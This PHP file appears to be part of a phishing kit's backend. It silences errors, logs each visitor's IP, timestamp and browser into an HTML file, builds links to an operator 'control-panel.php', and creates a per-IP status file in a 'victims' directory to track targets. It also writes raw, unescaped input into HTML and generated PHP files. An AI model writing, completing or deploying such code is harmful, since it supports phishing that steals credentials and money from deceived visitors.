<?php
// Start session at the very beginning with proper settings
if (session_status() === PHP_SESSION_NONE) {
    // ini_set('session.save_path', __DIR__ . '/.sess');
    // ini_set('session.cookie_httponly', '1');
    // ini_set('session.cookie_secure', '1');
    // ini_set('session.cookie_samesite', 'Strict');
    session_start();
}

error_reporting(0);

require_once 'detect.php';
require_once 'infos.php';

function get_client_ip() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if( $ip == '::1' ) {
        return '127.0.0.1';
    }
    return $ip;
}

function visitors() {
    $detect         = new BrowserDetection();
    $ip             = $_SERVER['REMOTE_ADDR'];
    $date           = date("Y-m-d H:i:s", time());
    $usragent       = $_SERVER['HTTP_USER_AGENT'];
    $browserName    = $detect->getName();
    $browserVer     = $detect->getVersion();
    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
    $platformName   = $detect->getPlatform();
    $str = " <tr> <th scope='row'>$ip</th>  <td>$date</td> <td>$usragent</td> <td>[$isMobile] $browserName $browserVer </td> </tr>";
    file_put_contents('visitors.html', $str, FILE_APPEND | LOCK_EX);
}

function get_steps_link() {
    include "bak3r.php";
    $url = "http://". $_SERVER['HTTP_HOST'];
    $x = pathinfo($url);
    $ulr = "$url/$dir";
    return $ulr . '/control-panel.php?ip=' . get_client_ip();
}

function nocachescript($text) {
    $content = "<?php\r\n"; 
    $content .= "
                header_remove('ETag');
                header_remove('Pragma');
                header_remove('Cache-Control');
                header_remove('Last-Modified');
                header_remove('Expires');
                
                header('Expires: Thu, 1 Jan 1970 00:00:00 GMT');
                header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
                header('Cache-Control: post-check=0, pre-check=0',false);
                header('Pragma: no-cache');
    ";
    $content .= "echo \"".$text."\";\r\n";
    $content .= "?>";

return $content;
}

function reset_data() {
$fp = fopen('victims/'. get_client_ip() .'.php', 'wb');
fwrite($fp, nocachescript("0"));
fclose($fp);
}
?>